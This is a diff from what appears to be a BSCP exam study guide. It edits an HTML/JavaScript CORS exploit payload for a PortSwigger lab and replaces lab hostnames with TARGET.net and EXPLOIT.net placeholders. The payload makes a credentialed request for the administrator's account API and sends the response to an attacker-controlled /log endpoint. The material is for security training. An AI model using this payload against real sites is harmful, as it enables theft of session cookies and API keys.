@@ -1971,17 +1971,17 @@ Origin: http://subdomain.TARGET.NET
 
 [PortSwigger Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)  
   
->Payload that may work in BSCP exam on getting the administrator account api and session cookie logged on exploit server.  
+>Payload that may work in BSCP exam on getting the administrator account API and session cookie. Host on exploit server.  
 
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','https://0aee0024034c6237c3e99284006a0002.web-security-academy.net/account_api/?UnixTimestamp=1679134272000',true);
+    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);
     req.withCredentials = true;
     req.send();
     function reqListener() {
-        location='https://exploit-0a9e009703e062d9c365914c01700065.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);
     };
 </script>"></iframe>
 ```  
